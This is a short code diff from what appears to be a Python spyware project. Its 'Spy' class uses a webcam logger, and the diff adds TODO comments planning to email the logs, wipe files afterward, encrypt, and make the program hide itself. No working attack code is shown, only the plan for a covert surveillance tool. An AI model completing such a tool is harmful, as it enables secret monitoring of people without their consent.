@@ -9,6 +9,12 @@ from loggers.webcam_logger import WebcamLogger
 from utils.utils import create_log_directories
 from config import LOGS_DIRECTORY_PATH
 
+# TODO: Email stuff
+# TODO: File clearing after email
+# TODO: Log everything in a file that shows what is going on, email it periodically.
+# TODO: Encryption
+# TODO: Hide itself
+
 class Spy:
     def __init__(self):
         self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
